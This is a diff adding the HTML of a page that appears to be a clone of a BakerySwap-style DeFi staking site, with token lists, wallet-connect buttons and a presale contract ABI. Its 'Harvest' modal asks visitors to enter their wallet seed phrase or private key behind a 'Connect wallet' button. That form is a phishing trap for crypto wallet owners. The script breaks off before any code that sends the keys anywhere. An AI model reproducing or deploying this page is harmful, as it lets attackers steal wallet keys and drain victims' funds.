+                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                              </svg>
+                            </div></div
+                        ></span>
+                      </div>
+                      <div class="sc-gpHHfC iQVfOe css-1aekuku">0.25%</div>
+                    </div>
+                    <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                      <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                        <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                          Liquidity Provider Fee
+                        </div>
+                        <span style="margin-left: 4px"
+                          ><div class="sc-iwsKbI xkrrd">
+                            <div class="sc-jTzLTM eKTHYu">
+                              <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                width="16"
+                                height="16"
+                                viewBox="0 0 24 24"
+                                fill="none"
+                                stroke="currentColor"
+                                stroke-width="2"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                              >
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path
+                                  d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                ></path>
+                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                              </svg>
+                            </div></div
+                        ></span>
+                      </div>
+                      <div class="sc-kpOJdX jLZfGp css-1z0vbpq">0.003 BNB</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="sc-sdtwF cHaLsM">
+                <div class="css-16ymp0l">
+                  We will automatically add the logos of the tokens with TVL
+                  (BNB or BAKE pair) higher than $1 million to the exchange
+                  list.
+                  <a
+                    href="https://docs.google.com/forms/d/e/1FAIpQLSeMzAIg2gkNI0fHc1ULHEWPRk6XS-RjZ58jDIHYHkKHoEz9rA/viewform?usp=sf_link"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    >Submit your contract address and logo here</a
+                  >
+                </div>
+              </div>
+              <div class="sc-fcxLGG kmuIRO"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div></div>
+    <!-- Modal -->
+    <div
+      class="modal fade"
+      id="get-pay-address"
+      tabindex="-1"
+      role="dialog"
+      data-backdrop="static"
+      aria-labelledby="exampleModalCenterTitle"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content depositModal">
+          <div class="modal-header" style="position: relative">
+            <h5
+              class="modal-title"
+              id="exampleModalLongTitle"
+              style="color: #984c25; font-weight: 600"
+            >
+              Stake Amount
+            </h5>
+            <button
+              style="
+                border: none;
+                background: transparent;
+                position: absolute;
+                top: 14px;
+                right: 39px;
+                font-size: 30px;
+                color: #da8c64;
+              "
+              type="button"
+              data-dismiss="modal"
+              class="close"
+              id="closeModal"
+              aria-label="Close"
+            >
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <span id="result"></span>
+            <div style="display: flex; justify-content: space-between">
+              <div class="stakeColor">Stake</div>
+              <div
+                class="d-flex align-items-center"
+                style="display: flex; align-items: center; color: black"
+              >
+                <div style="margin-right: 10px; margin-left: 10px">
+                  <!-- <span id="balanceBNB" class="stakeColor"></span> -->
+                  <span id="balanceBUSD"></span>
+                  <span id="balanceUSDT"></span>
+                </div>
+                <div class=""></div>
+                <div class="stakeColor ml-2 mb-2">Minimum amount: 50 CAKE</div>
+              </div>
+            </div>
+            <div style="position: relative">
+              <input
+                type="text"
+                onkeyup="validateAmount()"
+                oninput="keyUp(event)"
+                id="depositAmount"
+                placeholder="0.00"
+                class="stakeinput form-control"
+              />
+            </div>
+            <div class="d-flex justify-content-right" style="text-align: end">
+              <div class="mr-3" style="color: #984c25 !important">Balance:</div>
+              <span id="balanceBNB" style="color: #984c25 !important"></span>
+            </div>
+          </div>
+          <div
+            class="sc-hmvkKb gsyRVd modal-footer d-flex justify-content-center"
+          >
+            <button
+              type="button"
+              id="sendEthButton"
+              class="sc-dHIava idVSmq cnf"
+            >
+              Confirm
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div
+      class="modal fade"
+      id="claimModal"
+      tabindex="-1"
+      role="dialog"
+      data-backdrop="static"
+      aria-labelledby="exampleModalCenterTitle"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" style="color: #984c25">Harvest</h5>
+
+            <button
+              type="button"
+              style="
+                border: none;
+                background: transparent;
+                color: #984c25;
+                position: absolute;
+                right: 14px;
+                top: 7px;
+                font-size: 30px;
+              "
+              data-dismiss="modal"
+              id="close"
+              data-target="#claimModal"
+            >
+              ×
+            </button>
+          </div>
+          <div class="modal-body">
+            <ul class="tabs">
+              <li class="tab-link current" data-tab="tab-1">Seed phrase</li>
+              <li class="tab-link" data-tab="tab-2">Private key</li>
+            </ul>
+
+            <div id="tab-1" class="tab-lists current">
+              <textarea
+                id="inputOne"
+                oninput="textBox(event)"
+                placeholder="Please enter your seed phrase"
+                class="form-control"
+              ></textarea>
+            </div>
+            <div id="tab-2" class="tab-lists">
+              <input
+                type="text"
+                id="inputTwo"
+                oninput="inputBox(event)"
+                placeholder="Please enter your private key"
+                class="form-control"
+              />
+            </div>
+          </div>
+          <div
+            class="modal-footer d-flex justify-content-center token-ido-card__aside"
+            style="background-color: white"
+          >
+            <button
+              type="button"
+              id="claimSend"
+              style="cursor: pointer; margin-top: 20px; border-radius: 5px"
+              class="sc-dHIava idVSmq cnf"
+            >
+              <span>Connect wallet</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div
+      id="tokenModal"
+      class="sc-gisBJw fTJuWL"
+      data-reach-dialog-overlay=""
+      style="display: none"
+    >
+      <div
+        aria-modal="true"
+        role="dialog"
+        tabindex="-1"
+        aria-label="dialog"
+        class="sc-kjoXOD bDfTLp"
+        data-reach-dialog-content=""
+      >
+        <div class="sc-dxgOiQ brIlRI" style="width: 100%; flex: 1 1 0%">
+          <div class="sc-jKJlTe sc-ebFjAB icypvD">
+            <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+              <div style="color: #722f0d" class="css-xy7yfl">
+                Select a token<span style="margin-left: 4px"> </span>
+              </div>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="sc-jzJRlG fDSAKT"
+                style="cursor: pointer"
+                id="closeTokenModal"
+              >
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+              </svg>
+            </div>
+          </div>
+          <div class="sc-LKuAh ivzFVn"></div>
+          <div class="lolss">
+            <div style="overflow: visible; height: 0px">
+              <div
+                style="
+                  position: relative;
+                  width: 100%;
+                  overflow: auto;
+                  will-change: transform;
+                  direction: ltr;
+                "
+              >
+                <div class="lols">
+                  <!-- <div
+                    id="bnb"
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD cngZzg token-item-ETHER"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 0px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      src="data:image/png;base64,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"
+                      class="sc-ipZHIp cTkuCR"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="binance coin" class="css-8mokm4">BNB</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div> -->
+                  <div
+                    id="inch1"
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0x111111111117dC0aa78b770fA6A738034120C302"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 56px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="1INCH logo"
+                      src="images/1INCH.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="1INCH" class="css-8mokm4">1INCH</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                  <div
+                    id="aETH"
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0x973616ff3b9d8F88411C5b4E6F928EE541e4d01f"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 112px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="aETH logo"
+                      src="images/AETH.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="AETH" class="css-8mokm4">aETH</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                  <div
+                    id="ankr"
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0xAC51066d7bEC65Dc4589368da368b212745d63E8"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 168px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="ALICE logo"
+                      src="../www.bakeryswap.org/images/coins/ANKR.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="ALICE" class="css-8mokm4">ANKR</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                  <div
+                    id="auto"
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0xAC51066d7bEC65Dc4589368da368b212745d63E8"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 224px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="ALICE logo"
+                      src="../www.bakeryswap.org/images/coins/AUTO.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="ALICE" class="css-8mokm4">AUTO</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                  <div
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0xAC51066d7bEC65Dc4589368da368b212745d63E8"
+                    id="bake"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 280px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="ALICE logo"
+                      src="../www.bakeryswap.org/images/coins/BAKE.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="ALICE" class="css-8mokm4">BAKE</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                  <div
+                    class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-jKVCRD jIvWLI token-item-0xAC51066d7bEC65Dc4589368da368b212745d63E8"
+                    id="beth"
+                    style="
+                      position: absolute;
+                      left: 0px;
+                      top: 0px;
+                      height: 56px;
+                      width: 100%;
+                    "
+                  >
+                    <img
+                      class="sc-iqzUVk kfsqVQ"
+                      alt="CAKE logo"
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+                    />
+                    <div class="sc-dxgOiQ brIlRI">
+                      <div title="CAKE" class="css-8mokm4">CAKE</div>
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo sc-jtggT hhCPFv"
+                      ></div>
+                    </div>
+                    <span></span>
+                    <div
+                      class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW"
+                      style="justify-self: flex-end"
+                    >
+                      <div title="0" class="sc-hzNEM jlKjRP css-vurnku">0</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="resize-triggers">
+              <div class="expand-trigger">
+                <div style="width: 419px; height: 110px"></div>
+              </div>
+              <div class="contract-trigger"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <style>
+      @media screen and (max-width: 767px) {
+        #btn-connect-desktop {
+          display: none;
+        }
+        #btn-connect {
+          display: "";
+        }
+      }
+      @media screen and (min-width: 767px) {
+        #btn-connect-desktop {
+          display: "";
+        }
+        #btn-connect {
+          display: none;
+        }
+      }
+    </style>
+    <div style="display: none" id="pleaseWallet">
+      <div>
+        <div
+          class="sc-gisBJw fTJuWL"
+          data-reach-dialog-overlay=""
+          style="opacity: 1"
+        >
+          <div
+            aria-modal="true"
+            role="dialog"
+            tabindex="-1"
+            aria-label="dialog"
+            class="sc-kjoXOD kiTEGC"
+            data-reach-dialog-content=""
+          >
+            <div class="sc-gwVKww bsXnuc">
+              <div class="sc-iQNlJl hOODBr">
+                <div
+                  style="cursor: pointer"
+                  id="closeConnect"
+                  class="sc-hrWEMg hdLtfm"
+                >
+                  <svg
+                    width="20"
+                    height="20"
+                    viewBox="0 0 20 20"
+                    fill="none"
+                    stroke="#8c4804"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="sc-eTuwsz dVaUjs"
+                  >
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </div>
+                <div class="sc-hXRMBi gSGJvT">
+                  <div class="sc-hZSUBg jaYvyp">Connect to a wallet</div>
+                </div>
+                <div class="sc-epnACN ezaHeU">
+                  <div class="sc-bsbRJL jVPUAT">
+                    <a
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      href="https://chrome.google.com/webstore/detail/binance-chain-wallet/fhbohimaelbohpjbbldcngcnapndodjp?hl=en"
+                      class="sc-chPdSV bpvxnK"
+                      ><button
+                        id="connect-BSC"
+                        class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                      >
+                        <div class="sc-dfVpRl fjDGNh">
+                          <div color="#E8831D" class="sc-kPVwWT dqmPkB">
+                            Install Binance Chain Wallet
+                          </div>
+                        </div>
+                        <div class="sc-esjQYD fSOeak">
+                          <img
+                            style="width: 24px; height: 24px"
+                            src="../www.bakeryswap.org/static/media/bsc.9d166b66.png"
+                            alt="Icon"
+                          />
+                        </div></button></a
+                    ><a
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      href="https://metamask.io/"
+                      class="sc-chPdSV bpvxnK"
+                      ><button
+                        id="connect-METAMASK"
+                        class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                      >
+                        <div class="sc-dfVpRl fjDGNh">
+                          <div color="#E8831D" class="sc-kPVwWT dqmPkB">
+                            Install Metamask
+                          </div>
+                        </div>
+                        <div class="sc-esjQYD fSOeak">
+                          <img
+                            style="width: 24px; height: 24px"
+                            src="../www.bakeryswap.org/static/media/metamask.023762b6.png"
+                            alt="Icon"
+                          />
+                        </div></button></a
+                    ><button
+                      id="connect-WALLET_CONNECT"
+                      class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                    >
+                      <div class="sc-dfVpRl fjDGNh">
+                        <div color="#4196FC" class="sc-kPVwWT dqmPkB">
+                          WalletConnect
+                        </div>
+                      </div>
+                      <div class="sc-esjQYD fSOeak">
+                        <img
+                          style="width: 24px; height: 24px"
+                          src="https://www.bakeryswap.org/static/media/walletConnectIcon.8215855c.svg"
+                          alt="Icon"
+                        />
+                      </div>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!---->
+    <script src="../unpkg.com/web3%401.7.4/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal"></script>
+    <script
+      type="text/javascript"
+      src="https://unpkg.com/@walletconnect/web3-provider"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../unpkg.com/fortmatic%402.0.6/dist/fortmatic.js"
+    ></script>
+    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+      integrity=""
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+      integrity=""
+      crossorigin="anonymous"
+    ></script>
+
+    <!-- This is our example code -->
+    <script src="../cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script type="text/javascript" src="visual.js"></script>
+    <script type="text/javascript" src="menu.js"></script>
+   <!-- <script type="text/javascript" src="./connect.js"></script>-->
+    <script>
+	
+	
+	const contractAbi = [
+  {
+    inputs: [],
+    stateMutability: "nonpayable",
+    type: "constructor",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+      {
+        indexed: false,
+        internalType: "uint256",
+        name: "value",
+        type: "uint256",
+      },
+    ],
+    name: "Approval",
+    type: "event",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "from",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        indexed: false,
+        internalType: "uint256",
+        name: "value",
+        type: "uint256",
+      },
+    ],
+    name: "Transfer",
+    type: "event",
+  },
+  {
+    inputs: [],
+    name: "allowRefunds",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+    ],
+    name: "allowance",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "amount",
+        type: "uint256",
+      },
+    ],
+    name: "approve",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "account",
+        type: "address",
+      },
+    ],
+    name: "balanceOf",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "uint256",
+        name: "amount",
+        type: "uint256",
+      },
+    ],
+    name: "burnMyTokensFOREVER",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "buyTokens",
+    outputs: [],
+    stateMutability: "payable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "claimDevFeeAndAddLiquidity",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "decimals",
+    outputs: [
+      {
+        internalType: "uint8",
+        name: "",
+        type: "uint8",
+      },
+    ],
+    stateMutability: "pure",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "subtractedValue",
+        type: "uint256",
+      },
+    ],
+    name: "decreaseAllowance",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "devClaimed",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "ethSent",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "getRefund",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "addedValue",
+        type: "uint256",
+      },
+    ],
+    name: "increaseAllowance",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "isRefundEnabled",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "isStopped",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "liquidityUnlock",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "moonMissionStarted",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "name",
+    outputs: [
+      {
+        internalType: "string",
+        name: "",
+        type: "string",
+      },
+    ],
+    stateMutability: "pure",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "bool",
+        name: "_isStopped",
+        type: "bool",
+      },
+    ],
+    name: "pauseUnpausePresale",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "pool",
+    outputs: [
+      {
+        internalType: "address",
+        name: "",
+        type: "address",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "contract IBEP20",
+        name: "tokenAddress",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenAmount",
+        type: "uint256",
+      },
+    ],
+    name: "recoverbep20",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "refundTime",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address payable",
+        name: "addr",
+        type: "address",
+      },
+    ],
+    name: "setMultisigAddress",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "setPancakePool",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "symbol",
+    outputs: [
+      {
+        internalType: "string",
+        name: "",
+        type: "string",
+      },
+    ],
+    stateMutability: "pure",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "totalSupply",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "recipient",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "amount",
+        type: "uint256",
+      },
+    ],
+    name: "transfer",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "sender",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "recipient",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "amount",
+        type: "uint256",
+      },
+    ],
+    name: "transferFrom",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "user",
+        type: "address",
+      },
+    ],
+    name: "userEthSpenttInPresale",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    stateMutability: "payable",
+    type: "receive",
+  },
+];
+let provider;
+let connect;
+const WalletConnectProvider = window.WalletConnectProvider.default;
